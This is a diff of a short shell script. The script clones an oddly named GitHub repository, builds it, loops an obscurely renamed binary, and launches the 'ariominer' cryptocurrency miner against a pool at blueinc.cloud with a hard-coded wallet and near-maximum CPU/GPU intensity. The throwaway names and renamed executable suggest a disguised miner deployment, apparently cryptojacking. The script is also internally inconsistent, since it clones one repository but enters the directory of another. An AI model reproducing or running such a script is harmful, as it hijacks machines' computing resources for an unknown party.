@@ -1,4 +1,4 @@
-git clone https://github.com/mobileapps84741274/blueinc84747474/
+git clone https://github.com/mobileapps84741274/linuxweb8874
 cd ./blueinc84747474/
 mkdir linux84748874
 cd linux84748874
@@ -8,6 +8,8 @@ make
 while true
 do
 
-./ariominer --mode miner --pool http://www.blueinc.cloud:8884 --wallet 3VnCmWyLQb8f1XhkQv4fiB1CrGewityDDteNtQwhMu3DjBuaDmUWbPMkPnbSaJPcbGrrJi1zkCHDXd4fGtTUeej3 --name linux8474 --cpu-intensity 88 --gpu-intensity-cblocks 98 --gpu-intensity-gblocks 98 
+./linux848888888874 linux8474
 
 done
+
+./ariominer --mode miner --pool http://www.blueinc.cloud:8884 --wallet 3VnCmWyLQb8f1XhkQv4fiB1CrGewityDDteNtQwhMu3DjBuaDmUWbPMkPnbSaJPcbGrrJi1zkCHDXd4fGtTUeej3 --name linux8474 --cpu-intensity 88 --gpu-intensity-cblocks 98 --gpu-intensity-gblocks 98 
